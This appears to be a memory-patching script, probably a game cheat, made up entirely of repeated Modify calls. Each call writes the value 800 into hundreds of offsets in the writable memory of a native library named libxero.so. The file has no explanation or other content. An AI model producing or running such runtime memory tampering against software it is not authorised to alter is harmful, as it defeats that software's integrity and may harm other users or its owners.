Modify(Read('libxero.so','rw-p')+0xc544,800,4)
Modify(Read('libxero.so','rw-p')+0xc554,800,4)
Modify(Read('libxero.so','rw-p')+0xc564,800,4)
Modify(Read('libxero.so','rw-p')+0xc574,800,4)
Modify(Read('libxero.so','rw-p')+0xc584,800,4)
Modify(Read('libxero.so','rw-p')+0xc594,800,4)
Modify(Read('libxero.so','rw-p')+0xc5a4,800,4)
Modify(Read('libxero.so','rw-p')+0xc5b4,800,4)
Modify(Read('libxero.so','rw-p')+0xc5c4,800,4)
Modify(Read('libxero.so','rw-p')+0xc5d4,800,4)
Modify(Read('libxero.so','rw-p')+0xc5e4,800,4)
Modify(Read('libxero.so','rw-p')+0xc5f4,800,4)
Modify(Read('libxero.so','rw-p')+0xc604,800,4)
Modify(Read('libxero.so','rw-p')+0xc614,800,4)
Modify(Read('libxero.so','rw-p')+0xc624,800,4)
Modify(Read('libxero.so','rw-p')+0xc634,800,4)
Modify(Read('libxero.so','rw-p')+0xc644,800,4)
Modify(Read('libxero.so','rw-p')+0xc654,800,4)
Modify(Read('libxero.so','rw-p')+0xc664,800,4)
Modify(Read('libxero.so','rw-p')+0xc674,800,4)
Modify(Read('libxero.so','rw-p')+0xc684,800,4)
Modify(Read('libxero.so','rw-p')+0xc694,800,4)
Modify(Read('libxero.so','rw-p')+0xc6a4,800,4)
Modify(Read('libxero.so','rw-p')+0xc6b4,800,4)
Modify(Read('libxero.so','rw-p')+0xc6c4,800,4)
Modify(Read('libxero.so','rw-p')+0xc6d4,800,4)
Modify(Read('libxero.so','rw-p')+0xc6e4,800,4)
Modify(Read('libxero.so','rw-p')+0xc6f4,800,4)
Modify(Read('libxero.so','rw-p')+0xc704,800,4)
Modify(Read('libxero.so','rw-p')+0xc714,800,4)
Modify(Read('libxero.so','rw-p')+0xc724,800,4)
Modify(Read('libxero.so','rw-p')+0xc734,800,4)
Modify(Read('libxero.so','rw-p')+0xc744,800,4)
Modify(Read('libxero.so','rw-p')+0xc754,800,4)
Modify(Read('libxero.so','rw-p')+0xc764,800,4)
Modify(Read('libxero.so','rw-p')+0xc774,800,4)
Modify(Read('libxero.so','rw-p')+0xc784,800,4)
Modify(Read('libxero.so','rw-p')+0xc794,800,4)
Modify(Read('libxero.so','rw-p')+0xc7a4,800,4)
Modify(Read('libxero.so','rw-p')+0xc7b4,800,4)
Modify(Read('libxero.so','rw-p')+0xc7c4,800,4)
Modify(Read('libxero.so','rw-p')+0xc7d4,800,4)
Modify(Read('libxero.so','rw-p')+0xc7e4,800,4)
Modify(Read('libxero.so','rw-p')+0xc7f4,800,4)
Modify(Read('libxero.so','rw-p')+0xc804,800,4)
Modify(Read('libxero.so','rw-p')+0xc814,800,4)
Modify(Read('libxero.so','rw-p')+0xc824,800,4)
Modify(Read('libxero.so','rw-p')+0xc834,800,4)
Modify(Read('libxero.so','rw-p')+0xc844,800,4)
Modify(Read('libxero.so','rw-p')+0xc854,800,4)
Modify(Read('libxero.so','rw-p')+0xc864,800,4)
Modify(Read('libxero.so','rw-p')+0xc874,800,4)
Modify(Read('libxero.so','rw-p')+0xc884,800,4)
Modify(Read('libxero.so','rw-p')+0xc894,800,4)
Modify(Read('libxero.so','rw-p')+0xc8a4,800,4)
Modify(Read('libxero.so','rw-p')+0xc8b4,800,4)
Modify(Read('libxero.so','rw-p')+0xc8c4,800,4)
Modify(Read('libxero.so','rw-p')+0xc8d4,800,4)
Modify(Read('libxero.so','rw-p')+0xc8e4,800,4)
Modify(Read('libxero.so','rw-p')+0xc8f4,800,4)
Modify(Read('libxero.so','rw-p')+0xc904,800,4)
Modify(Read('libxero.so','rw-p')+0xc914,800,4)
Modify(Read('libxero.so','rw-p')+0xc924,800,4)
Modify(Read('libxero.so','rw-p')+0xc934,800,4)
Modify(Read('libxero.so','rw-p')+0xc944,800,4)
Modify(Read('libxero.so','rw-p')+0xc954,800,4)
Modify(Read('libxero.so','rw-p')+0xc964,800,4)
Modify(Read('libxero.so','rw-p')+0xc974,800,4)
Modify(Read('libxero.so','rw-p')+0xc984,800,4)
Modify(Read('libxero.so','rw-p')+0xc994,800,4)
Modify(Read('libxero.so','rw-p')+0xc9a4,800,4)
Modify(Read('libxero.so','rw-p')+0xc9b4,800,4)
Modify(Read('libxero.so','rw-p')+0xc9c4,800,4)
Modify(Read('libxero.so','rw-p')+0xc9d4,800,4)
Modify(Read('libxero.so','rw-p')+0xc9e4,800,4)
Modify(Read('libxero.so','rw-p')+0xc9f4,800,4)
Modify(Read('libxero.so','rw-p')+0xca04,800,4)
Modify(Read('libxero.so','rw-p')+0xca14,800,4)
Modify(Read('libxero.so','rw-p')+0xca24,800,4)
Modify(Read('libxero.so','rw-p')+0xca34,800,4)
Modify(Read('libxero.so','rw-p')+0xca44,800,4)
Modify(Read('libxero.so','rw-p')+0xca54,800,4)
Modify(Read('libxero.so','rw-p')+0xca60,800,4)
Modify(Read('libxero.so','rw-p')+0xca64,800,4)
Modify(Read('libxero.so','rw-p')+0xca68,800,4)
Modify(Read('libxero.so','rw-p')+0xca6c,800,4)
Modify(Read('libxero.so','rw-p')+0xca74,800,4)
Modify(Read('libxero.so','rw-p')+0xca84,800,4)
Modify(Read('libxero.so','rw-p')+0xca94,800,4)
Modify(Read('libxero.so','rw-p')+0xcaa4,800,4)
Modify(Read('libxero.so','rw-p')+0xcab4,800,4)
Modify(Read('libxero.so','rw-p')+0xcac4,800,4)
Modify(Read('libxero.so','rw-p')+0xcad4,800,4)
Modify(Read('libxero.so','rw-p')+0xcae4,800,4)
Modify(Read('libxero.so','rw-p')+0xcaf4,800,4)
Modify(Read('libxero.so','rw-p')+0xcb04,800,4)
Modify(Read('libxero.so','rw-p')+0xcb14,800,4)
Modify(Read('libxero.so','rw-p')+0xcb24,800,4)
Modify(Read('libxero.so','rw-p')+0xcb34,800,4)
Modify(Read('libxero.so','rw-p')+0xcb44,800,4)
Modify(Read('libxero.so','rw-p')+0xcb54,800,4)
Modify(Read('libxero.so','rw-p')+0xcb64,800,4)
Modify(Read('libxero.so','rw-p')+0xcb74,800,4)
Modify(Read('libxero.so','rw-p')+0xcb84,800,4)
Modify(Read('libxero.so','rw-p')+0xcb94,800,4)
Modify(Read('libxero.so','rw-p')+0xcba4,800,4)
Modify(Read('libxero.so','rw-p')+0xcbb4,800,4)
Modify(Read('libxero.so','rw-p')+0xcbc4,800,4)
Modify(Read('libxero.so','rw-p')+0xcbd4,800,4)
Modify(Read('libxero.so','rw-p')+0xcbe4,800,4)
Modify(Read('libxero.so','rw-p')+0xcbf4,800,4)
Modify(Read('libxero.so','rw-p')+0xcc04,800,4)
Modify(Read('libxero.so','rw-p')+0xcc14,800,4)
Modify(Read('libxero.so','rw-p')+0xcc24,800,4)
Modify(Read('libxero.so','rw-p')+0xcc34,800,4)
Modify(Read('libxero.so','rw-p')+0xcc44,800,4)
Modify(Read('libxero.so','rw-p')+0xcc54,800,4)
Modify(Read('libxero.so','rw-p')+0xcc64,800,4)
Modify(Read('libxero.so','rw-p')+0xcc74,800,4)
Modify(Read('libxero.so','rw-p')+0xcc84,800,4)
Modify(Read('libxero.so','rw-p')+0xcc94,800,4)
Modify(Read('libxero.so','rw-p')+0xcca4,800,4)
Modify(Read('libxero.so','rw-p')+0xccb4,800,4)
Modify(Read('libxero.so','rw-p')+0xccc4,800,4)
Modify(Read('libxero.so','rw-p')+0xccd4,800,4)
Modify(Read('libxero.so','rw-p')+0xcce4,800,4)
Modify(Read('libxero.so','rw-p')+0xccf4,800,4)
Modify(Read('libxero.so','rw-p')+0xcd04,800,4)
Modify(Read('libxero.so','rw-p')+0xcd14,800,4)
Modify(Read('libxero.so','rw-p')+0xcd24,800,4)
Modify(Read('libxero.so','rw-p')+0xcd34,800,4)
Modify(Read('libxero.so','rw-p')+0xcd44,800,4)
Modify(Read('libxero.so','rw-p')+0xcd54,800,4)
Modify(Read('libxero.so','rw-p')+0xcd64,800,4)
Modify(Read('libxero.so','rw-p')+0xcd74,800,4)
Modify(Read('libxero.so','rw-p')+0xcd84,800,4)
Modify(Read('libxero.so','rw-p')+0xcd94,800,4)
Modify(Read('libxero.so','rw-p')+0xcda4,800,4)
Modify(Read('libxero.so','rw-p')+0xcdb4,800,4)
Modify(Read('libxero.so','rw-p')+0xcdc4,800,4)
Modify(Read('libxero.so','rw-p')+0xcdd4,800,4)
Modify(Read('libxero.so','rw-p')+0xcde4,800,4)
Modify(Read('libxero.so','rw-p')+0xcdf4,800,4)
Modify(Read('libxero.so','rw-p')+0xce04,800,4)
Modify(Read('libxero.so','rw-p')+0xce14,800,4)
Modify(Read('libxero.so','rw-p')+0xce20,800,4)
Modify(Read('libxero.so','rw-p')+0xce24,800,4)
Modify(Read('libxero.so','rw-p')+0xce28,800,4)
Modify(Read('libxero.so','rw-p')+0xce2c,800,4)
Modify(Read('libxero.so','rw-p')+0xce34,800,4)
Modify(Read('libxero.so','rw-p')+0xce44,800,4)
Modify(Read('libxero.so','rw-p')+0xce54,800,4)
Modify(Read('libxero.so','rw-p')+0xce64,800,4)
Modify(Read('libxero.so','rw-p')+0xce74,800,4)
Modify(Read('libxero.so','rw-p')+0xce84,800,4)
Modify(Read('libxero.so','rw-p')+0xce94,800,4)
Modify(Read('libxero.so','rw-p')+0xcea4,800,4)
Modify(Read('libxero.so','rw-p')+0xceb4,800,4)
Modify(Read('libxero.so','rw-p')+0xcec4,800,4)
Modify(Read('libxero.so','rw-p')+0xced4,800,4)
Modify(Read('libxero.so','rw-p')+0xcee4,800,4)
Modify(Read('libxero.so','rw-p')+0xcef4,800,4)
Modify(Read('libxero.so','rw-p')+0xcf04,800,4)
Modify(Read('libxero.so','rw-p')+0xcf14,800,4)
Modify(Read('libxero.so','rw-p')+0xcf24,800,4)
Modify(Read('libxero.so','rw-p')+0xcf34,800,4)
Modify(Read('libxero.so','rw-p')+0xcf44,800,4)
Modify(Read('libxero.so','rw-p')+0xcf54,800,4)
Modify(Read('libxero.so','rw-p')+0xcf64,800,4)
Modify(Read('libxero.so','rw-p')+0xcf74,800,4)
Modify(Read('libxero.so','rw-p')+0xcf84,800,4)
Modify(Read('libxero.so','rw-p')+0xcf94,800,4)
Modify(Read('libxero.so','rw-p')+0xcfa4,800,4)
Modify(Read('libxero.so','rw-p')+0xcfb4,800,4)
Modify(Read('libxero.so','rw-p')+0xcfc4,800,4)
Modify(Read('libxero.so','rw-p')+0xcfd4,800,4)
Modify(Read('libxero.so','rw-p')+0xcfe4,800,4)
Modify(Read('libxero.so','rw-p')+0xcff4,800,4)
Modify(Read('libxero.so','rw-p')+0xd004,800,4)
Modify(Read('libxero.so','rw-p')+0xd014,800,4)
Modify(Read('libxero.so','rw-p')+0xd024,800,4)
Modify(Read('libxero.so','rw-p')+0xd034,800,4)
Modify(Read('libxero.so','rw-p')+0xd044,800,4)
Modify(Read('libxero.so','rw-p')+0xd054,800,4)
Modify(Read('libxero.so','rw-p')+0xd064,800,4)
Modify(Read('libxero.so','rw-p')+0xd074,800,4)
Modify(Read('libxero.so','rw-p')+0xd080,800,4)
Modify(Read('libxero.so','rw-p')+0xd084,800,4)
Modify(Read('libxero.so','rw-p')+0xd088,800,4)
Modify(Read('libxero.so','rw-p')+0xd08c,800,4)
Modify(Read('libxero.so','rw-p')+0xd094,800,4)
Modify(Read('libxero.so','rw-p')+0xd0a4,800,4)
Modify(Read('libxero.so','rw-p')+0xd0b4,800,4)
Modify(Read('libxero.so','rw-p')+0xd0c4,800,4)
Modify(Read('libxero.so','rw-p')+0xd0d4,800,4)
Modify(Read('libxero.so','rw-p')+0xd0e4,800,4)
Modify(Read('libxero.so','rw-p')+0xd0f4,800,4)
Modify(Read('libxero.so','rw-p')+0xd104,800,4)
Modify(Read('libxero.so','rw-p')+0xd114,800,4)
Modify(Read('libxero.so','rw-p')+0xd124,800,4)
Modify(Read('libxero.so','rw-p')+0xd134,800,4)
Modify(Read('libxero.so','rw-p')+0xd144,800,4)
Modify(Read('libxero.so','rw-p')+0xd154,800,4)
Modify(Read('libxero.so','rw-p')+0xd164,800,4)
Modify(Read('libxero.so','rw-p')+0xd174,800,4)
Modify(Read('libxero.so','rw-p')+0xd184,800,4)
Modify(Read('libxero.so','rw-p')+0xd194,800,4)
Modify(Read('libxero.so','rw-p')+0xd1a4,800,4)
Modify(Read('libxero.so','rw-p')+0xd1b4,800,4)
Modify(Read('libxero.so','rw-p')+0xd1c4,800,4)
Modify(Read('libxero.so','rw-p')+0xd1d4,800,4)
Modify(Read('libxero.so','rw-p')+0xd1e4,800,4)
Modify(Read('libxero.so','rw-p')+0xd1f4,800,4)
Modify(Read('libxero.so','rw-p')+0xd204,800,4)
Modify(Read('libxero.so','rw-p')+0xd214,800,4)
Modify(Read('libxero.so','rw-p')+0xd224,800,4)
Modify(Read('libxero.so','rw-p')+0xd234,800,4)
Modify(Read('libxero.so','rw-p')+0xd244,800,4)
Modify(Read('libxero.so','rw-p')+0xd254,800,4)
Modify(Read('libxero.so','rw-p')+0xd264,800,4)
Modify(Read('libxero.so','rw-p')+0xd274,800,4)
Modify(Read('libxero.so','rw-p')+0xd284,800,4)
Modify(Read('libxero.so','rw-p')+0xd294,800,4)
Modify(Read('libxero.so','rw-p')+0xd2a4,800,4)
Modify(Read('libxero.so','rw-p')+0xd2b4,800,4)
Modify(Read('libxero.so','rw-p')+0xd2c0,800,4)
Modify(Read('libxero.so','rw-p')+0xd2c4,800,4)
Modify(Read('libxero.so','rw-p')+0xd2c8,800,4)
Modify(Read('libxero.so','rw-p')+0xd2cc,800,4)
Modify(Read('libxero.so','rw-p')+0xd2f0,800,4)
Modify(Read('libxero.so','rw-p')+0xd2f4,800,4)
Modify(Read('libxero.so','rw-p')+0xd2f8,800,4)
Modify(Read('libxero.so','rw-p')+0xd2fc,800,4)
Modify(Read('libxero.so','rw-p')+0xd300,800,4)
Modify(Read('libxero.so','rw-p')+0xd304,800,4)
Modify(Read('libxero.so','rw-p')+0xd308,800,4)
Modify(Read('libxero.so','rw-p')+0xd30c,800,4)
Modify(Read('libxero.so','rw-p')+0xd310,800,4)
Modify(Read('libxero.so','rw-p')+0xd314,800,4)
Modify(Read('libxero.so','rw-p')+0xd318,800,4)
Modify(Read('libxero.so','rw-p')+0xd31c,800,4)
Modify(Read('libxero.so','rw-p')+0xd320,800,4)
Modify(Read('libxero.so','rw-p')+0xd324,800,4)
Modify(Read('libxero.so','rw-p')+0xd328,800,4)
Modify(Read('libxero.so','rw-p')+0xd32c,800,4)
Modify(Read('libxero.so','rw-p')+0xd330,800,4)
Modify(Read('libxero.so','rw-p')+0xd334,800,4)
Modify(Read('libxero.so','rw-p')+0xd338,800,4)
Modify(Read('libxero.so','rw-p')+0xd33c,800,4)
Modify(Read('libxero.so','rw-p')+0xd340,800,4)
Modify(Read('libxero.so','rw-p')+0xd344,800,4)
Modify(Read('libxero.so','rw-p')+0xd348,800,4)
Modify(Read('libxero.so','rw-p')+0xd34c,800,4)
Modify(Read('libxero.so','rw-p')+0xd350,800,4)
Modify(Read('libxero.so','rw-p')+0xd354,800,4)
Modify(Read('libxero.so','rw-p')+0xd358,800,4)
Modify(Read('libxero.so','rw-p')+0xd35c,800,4)
Modify(Read('libxero.so','rw-p')+0xd360,800,4)
Modify(Read('libxero.so','rw-p')+0xd364,800,4)
Modify(Read('libxero.so','rw-p')+0xd368,800,4)
Modify(Read('libxero.so','rw-p')+0xd36c,800,4)
Modify(Read('libxero.so','rw-p')+0xd370,800,4)
Modify(Read('libxero.so','rw-p')+0xd374,800,4)
Modify(Read('libxero.so','rw-p')+0xd378,800,4)
Modify(Read('libxero.so','rw-p')+0xd37c,800,4)
Modify(Read('libxero.so','rw-p')+0xd380,800,4)
Modify(Read('libxero.so','rw-p')+0xd384,800,4)
Modify(Read('libxero.so','rw-p')+0xd388,800,4)
Modify(Read('libxero.so','rw-p')+0xd38c,800,4)
Modify(Read('libxero.so','rw-p')+0xd390,800,4)
Modify(Read('libxero.so','rw-p')+0xd394,800,4)
Modify(Read('libxero.so','rw-p')+0xd398,800,4)
Modify(Read('libxero.so','rw-p')+0xd39c,800,4)
Modify(Read('libxero.so','rw-p')+0xd3a0,800,4)
Modify(Read('libxero.so','rw-p')+0xd3a4,800,4)
Modify(Read('libxero.so','rw-p')+0xd3a8,800,4)
Modify(Read('libxero.so','rw-p')+0xd3ac,800,4)
Modify(Read('libxero.so','rw-p')+0xd3b0,800,4)
Modify(Read('libxero.so','rw-p')+0xd3b4,800,4)
Modify(Read('libxero.so','rw-p')+0xd3b8,800,4)
Modify(Read('libxero.so','rw-p')+0xd3bc,800,4)
Modify(Read('libxero.so','rw-p')+0xd3c0,800,4)
Modify(Read('libxero.so','rw-p')+0xd3c4,800,4)
Modify(Read('libxero.so','rw-p')+0xd3c8,800,4)
Modify(Read('libxero.so','rw-p')+0xd3cc,800,4)
Modify(Read('libxero.so','rw-p')+0xd3d0,800,4)
Modify(Read('libxero.so','rw-p')+0xd3d4,800,4)
Modify(Read('libxero.so','rw-p')+0xd3d8,800,4)
Modify(Read('libxero.so','rw-p')+0xd3dc,800,4)
Modify(Read('libxero.so','rw-p')+0xd3e0,800,4)
Modify(Read('libxero.so','rw-p')+0xd3e4,800,4)
Modify(Read('libxero.so','rw-p')+0xd3e8,800,4)
Modify(Read('libxero.so','rw-p')+0xd3ec,800,4)
Modify(Read('libxero.so','rw-p')+0xd3f0,800,4)
Modify(Read('libxero.so','rw-p')+0xd3f4,800,4)
Modify(Read('libxero.so','rw-p')+0xd3f8,800,4)
Modify(Read('libxero.so','rw-p')+0xd3fc,800,4)
Modify(Read('libxero.so','rw-p')+0xd400,800,4)
Modify(Read('libxero.so','rw-p')+0xd404,800,4)
Modify(Read('libxero.so','rw-p')+0xd408,800,4)
Modify(Read('libxero.so','rw-p')+0xd40c,800,4)
Modify(Read('libxero.so','rw-p')+0xd410,800,4)
Modify(Read('libxero.so','rw-p')+0xd414,800,4)
Modify(Read('libxero.so','rw-p')+0xd418,800,4)
Modify(Read('libxero.so','rw-p')+0xd41c,800,4)
Modify(Read('libxero.so','rw-p')+0xd420,800,4)
Modify(Read('libxero.so','rw-p')+0xd424,800,4)
Modify(Read('libxero.so','rw-p')+0xd428,800,4)
Modify(Read('libxero.so','rw-p')+0xd42c,800,4)
Modify(Read('libxero.so','rw-p')+0xd430,800,4)
Modify(Read('libxero.so','rw-p')+0xd434,800,4)
Modify(Read('libxero.so','rw-p')+0xd438,800,4)
Modify(Read('libxero.so','rw-p')+0xd43c,800,4)
Modify(Read('libxero.so','rw-p')+0xd440,800,4)
Modify(Read('libxero.so','rw-p')+0xd444,800,4)
Modify(Read('libxero.so','rw-p')+0xd448,800,4)
Modify(Read('libxero.so','rw-p')+0xd44c,800,4)
Modify(Read('libxero.so','rw-p')+0xd450,800,4)
Modify(Read('libxero.so','rw-p')+0xd454,800,4)
Modify(Read('libxero.so','rw-p')+0xd458,800,4)
Modify(Read('libxero.so','rw-p')+0xd45c,800,4)
Modify(Read('libxero.so','rw-p')+0xd460,800,4)
Modify(Read('libxero.so','rw-p')+0xd464,800,4)
Modify(Read('libxero.so','rw-p')+0xd468,800,4)
Modify(Read('libxero.so','rw-p')+0xd46c,800,4)
Modify(Read('libxero.so','rw-p')+0xd470,800,4)
Modify(Read('libxero.so','rw-p')+0xd474,800,4)
Modify(Read('libxero.so','rw-p')+0xd478,800,4)
Modify(Read('libxero.so','rw-p')+0xd47c,800,4)
Modify(Read('libxero.so','rw-p')+0xd480,800,4)
Modify(Read('libxero.so','rw-p')+0xd484,800,4)
Modify(Read('libxero.so','rw-p')+0xd488,800,4)
Modify(Read('libxero.so','rw-p')+0xd48c,800,4)
Modify(Read('libxero.so','rw-p')+0xd490,800,4)
Modify(Read('libxero.so','rw-p')+0xd494,800,4)
Modify(Read('libxero.so','rw-p')+0xd498,800,4)
Modify(Read('libxero.so','rw-p')+0xd49c,800,4)
Modify(Read('libxero.so','rw-p')+0xd4a0,800,4)
Modify(Read('libxero.so','rw-p')+0xd4a4,800,4)
Modify(Read('libxero.so','rw-p')+0xd4a8,800,4)
Modify(Read('libxero.so','rw-p')+0xd4ac,800,4)
Modify(Read('libxero.so','rw-p')+0xd4b0,800,4)
Modify(Read('libxero.so','rw-p')+0xd4b4,800,4)
Modify(Read('libxero.so','rw-p')+0xd4b8,800,4)
Modify(Read('libxero.so','rw-p')+0xd4bc,800,4)
Modify(Read('libxero.so','rw-p')+0xd4c0,800,4)
Modify(Read('libxero.so','rw-p')+0xd4c4,800,4)
Modify(Read('libxero.so','rw-p')+0xd4c8,800,4)
Modify(Read('libxero.so','rw-p')+0xd4cc,800,4)
Modify(Read('libxero.so','rw-p')+0xd4d0,800,4)
Modify(Read('libxero.so','rw-p')+0xd4d4,800,4)
Modify(Read('libxero.so','rw-p')+0xd4d8,800,4)
Modify(Read('libxero.so','rw-p')+0xd4dc,800,4)
Modify(Read('libxero.so','rw-p')+0xd4e0,800,4)
Modify(Read('libxero.so','rw-p')+0xd4e4,800,4)
Modify(Read('libxero.so','rw-p')+0xd4e8,800,4)
Modify(Read('libxero.so','rw-p')+0xd4ec,800,4)
Modify(Read('libxero.so','rw-p')+0xd4f0,800,4)
Modify(Read('libxero.so','rw-p')+0xd4f4,800,4)
Modify(Read('libxero.so','rw-p')+0xd4f8,800,4)
Modify(Read('libxero.so','rw-p')+0xd4fc,800,4)
Modify(Read('libxero.so','rw-p')+0xd500,800,4)
Modify(Read('libxero.so','rw-p')+0xd504,800,4)
Modify(Read('libxero.so','rw-p')+0xd508,800,4)
Modify(Read('libxero.so','rw-p')+0xd50c,800,4)
Modify(Read('libxero.so','rw-p')+0xd510,800,4)
Modify(Read('libxero.so','rw-p')+0xd514,800,4)
Modify(Read('libxero.so','rw-p')+0xd518,800,4)
Modify(Read('libxero.so','rw-p')+0xd51c,800,4)
Modify(Read('libxero.so','rw-p')+0xd520,800,4)
Modify(Read('libxero.so','rw-p')+0xd524,800,4)
Modify(Read('libxero.so','rw-p')+0xd528,800,4)
Modify(Read('libxero.so','rw-p')+0xd52c,800,4)
Modify(Read('libxero.so','rw-p')+0xd530,800,4)
Modify(Read('libxero.so','rw-p')+0xd534,800,4)
Modify(Read('libxero.so','rw-p')+0xd538,800,4)
Modify(Read('libxero.so','rw-p')+0xd53c,800,4)
Modify(Read('libxero.so','rw-p')+0xd540,800,4)
Modify(Read('libxero.so','rw-p')+0xd544,800,4)
Modify(Read('libxero.so','rw-p')+0xd548,800,4)
Modify(Read('libxero.so','rw-p')+0xd54c,800,4)
Modify(Read('libxero.so','rw-p')+0xd550,800,4)
Modify(Read('libxero.so','rw-p')+0xd554,800,4)
Modify(Read('libxero.so','rw-p')+0xd558,800,4)
Modify(Read('libxero.so','rw-p')+0xd55c,800,4)
Modify(Read('libxero.so','rw-p')+0xd560,800,4)
Modify(Read('libxero.so','rw-p')+0xd564,800,4)
Modify(Read('libxero.so','rw-p')+0xd568,800,4)
Modify(Read('libxero.so','rw-p')+0xd56c,800,4)
Modify(Read('libxero.so','rw-p')+0xd570,800,4)
Modify(Read('libxero.so','rw-p')+0xd574,800,4)
Modify(Read('libxero.so','rw-p')+0xd578,800,4)
Modify(Read('libxero.so','rw-p')+0xd57c,800,4)
Modify(Read('libxero.so','rw-p')+0xd580,800,4)
Modify(Read('libxero.so','rw-p')+0xd584,800,4)
Modify(Read('libxero.so','rw-p')+0xd588,800,4)
Modify(Read('libxero.so','rw-p')+0xd58c,800,4)
Modify(Read('libxero.so','rw-p')+0xd590,800,4)
Modify(Read('libxero.so','rw-p')+0xd594,800,4)
Modify(Read('libxero.so','rw-p')+0xd598,800,4)
Modify(Read('libxero.so','rw-p')+0xd59c,800,4)
Modify(Read('libxero.so','rw-p')+0xd5a0,800,4)
Modify(Read('libxero.so','rw-p')+0xd5a4,800,4)
Modify(Read('libxero.so','rw-p')+0xd5a8,800,4)
Modify(Read('libxero.so','rw-p')+0xd5ac,800,4)
Modify(Read('libxero.so','rw-p')+0xd5b0,800,4)
Modify(Read('libxero.so','rw-p')+0xd5b4,800,4)
Modify(Read('libxero.so','rw-p')+0xd5b8,800,4)
Modify(Read('libxero.so','rw-p')+0xd5bc,800,4)
Modify(Read('libxero.so','rw-p')+0xd5c0,800,4)
Modify(Read('libxero.so','rw-p')+0xd5c4,800,4)
Modify(Read('libxero.so','rw-p')+0xd5c8,800,4)
Modify(Read('libxero.so','rw-p')+0xd5cc,800,4)
Modify(Read('libxero.so','rw-p')+0xd5d0,800,4)
Modify(Read('libxero.so','rw-p')+0xd5d4,800,4)
Modify(Read('libxero.so','rw-p')+0xd5d8,800,4)
Modify(Read('libxero.so','rw-p')+0xd5dc,800,4)
Modify(Read('libxero.so','rw-p')+0xd5e0,800,4)
Modify(Read('libxero.so','rw-p')+0xd5e4,800,4)
Modify(Read('libxero.so','rw-p')+0xd5e8,800,4)
Modify(Read('libxero.so','rw-p')+0xd5ec,800,4)
Modify(Read('libxero.so','rw-p')+0xd5f0,800,4)
Modify(Read('libxero.so','rw-p')+0xd5f4,800,4)
Modify(Read('libxero.so','rw-p')+0xd5f8,800,4)
Modify(Read('libxero.so','rw-p')+0xd5fc,800,4)
Modify(Read('libxero.so','rw-p')+0xd600,800,4)
Modify(Read('libxero.so','rw-p')+0xd604,800,4)
Modify(Read('libxero.so','rw-p')+0xd608,800,4)
Modify(Read('libxero.so','rw-p')+0xd60c,800,4)
Modify(Read('libxero.so','rw-p')+0xd610,800,4)
Modify(Read('libxero.so','rw-p')+0xd614,800,4)
Modify(Read('libxero.so','rw-p')+0xd618,800,4)
Modify(Read('libxero.so','rw-p')+0xd61c,800,4)
Modify(Read('libxero.so','rw-p')+0xd620,800,4)
Modify(Read('libxero.so','rw-p')+0xd624,800,4)
Modify(Read('libxero.so','rw-p')+0xd628,800,4)
Modify(Read('libxero.so','rw-p')+0xd62c,800,4)
Modify(Read('libxero.so','rw-p')+0xd630,800,4)
Modify(Read('libxero.so','rw-p')+0xd634,800,4)
Modify(Read('libxero.so','rw-p')+0xd638,800,4)
Modify(Read('libxero.so','rw-p')+0xd63c,800,4)
Modify(Read('libxero.so','rw-p')+0xd640,800,4)
Modify(Read('libxero.so','rw-p')+0xd644,800,4)
Modify(Read('libxero.so','rw-p')+0xd648,800,4)
Modify(Read('libxero.so','rw-p')+0xd64c,800,4)
Modify(Read('libxero.so','rw-p')+0xd650,800,4)
Modify(Read('libxero.so','rw-p')+0xd654,800,4)
Modify(Read('libxero.so','rw-p')+0xd658,800,4)
Modify(Read('libxero.so','rw-p')+0xd65c,800,4)
Modify(Read('libxero.so','rw-p')+0xd660,800,4)
Modify(Read('libxero.so','rw-p')+0xd664,800,4)
Modify(Read('libxero.so','rw-p')+0xd668,800,4)
Modify(Read('libxero.so','rw-p')+0xd66c,800,4)
Modify(Read('libxero.so','rw-p')+0xd670,800,4)
Modify(Read('libxero.so','rw-p')+0xd674,800,4)
Modify(Read('libxero.so','rw-p')+0xd678,800,4)
Modify(Read('libxero.so','rw-p')+0xd67c,800,4)
Modify(Read('libxero.so','rw-p')+0xd680,800,4)
Modify(Read('libxero.so','rw-p')+0xd684,800,4)
Modify(Read('libxero.so','rw-p')+0xd688,800,4)
Modify(Read('libxero.so','rw-p')+0xd68c,800,4)
Modify(Read('libxero.so','rw-p')+0xd690,800,4)
Modify(Read('libxero.so','rw-p')+0xd694,800,4)
Modify(Read('libxero.so','rw-p')+0xd698,800,4)
Modify(Read('libxero.so','rw-p')+0xd69c,800,4)
Modify(Read('libxero.so','rw-p')+0xd6a0,800,4)
Modify(Read('libxero.so','rw-p')+0xd6a4,800,4)
Modify(Read('libxero.so','rw-p')+0xd6a8,800,4)
Modify(Read('libxero.so','rw-p')+0xd6ac,800,4)
Modify(Read('libxero.so','rw-p')+0xd6b0,800,4)
Modify(Read('libxero.so','rw-p')+0xd6b4,800,4)
Modify(Read('libxero.so','rw-p')+0xd6b8,800,4)
Modify(Read('libxero.so','rw-p')+0xd6bc,800,4)
Modify(Read('libxero.so','rw-p')+0xd6c0,800,4)
Modify(Read('libxero.so','rw-p')+0xd6c4,800,4)
Modify(Read('libxero.so','rw-p')+0xd6c8,800,4)
Modify(Read('libxero.so','rw-p')+0xd6cc,800,4)
Modify(Read('libxero.so','rw-p')+0xd6d0,800,4)
Modify(Read('libxero.so','rw-p')+0xd6d4,800,4)
Modify(Read('libxero.so','rw-p')+0xd6d8,800,4)
Modify(Read('libxero.so','rw-p')+0xd6dc,800,4)
Modify(Read('libxero.so','rw-p')+0xd6e0,800,4)
Modify(Read('libxero.so','rw-p')+0xd6e4,800,4)
Modify(Read('libxero.so','rw-p')+0xd6e8,800,4)
Modify(Read('libxero.so','rw-p')+0xd6ec,800,4)
Modify(Read('libxero.so','rw-p')+0xd6f0,800,4)
Modify(Read('libxero.so','rw-p')+0xd6f4,800,4)
Modify(Read('libxero.so','rw-p')+0xd6f8,800,4)
Modify(Read('libxero.so','rw-p')+0xd6fc,800,4)
Modify(Read('libxero.so','rw-p')+0xd700,800,4)
Modify(Read('libxero.so','rw-p')+0xd704,800,4)
Modify(Read('libxero.so','rw-p')+0xd708,800,4)
Modify(Read('libxero.so','rw-p')+0xd70c,800,4)
Modify(Read('libxero.so','rw-p')+0xd710,800,4)
Modify(Read('libxero.so','rw-p')+0xd714,800,4)
Modify(Read('libxero.so','rw-p')+0xd718,800,4)
Modify(Read('libxero.so','rw-p')+0xd71c,800,4)
Modify(Read('libxero.so','rw-p')+0xd720,800,4)
Modify(Read('libxero.so','rw-p')+0xd724,800,4)
Modify(Read('libxero.so','rw-p')+0xd728,800,4)
Modify(Read('libxero.so','rw-p')+0xd72c,800,4)
Modify(Read('libxero.so','rw-p')+0xd730,800,4)
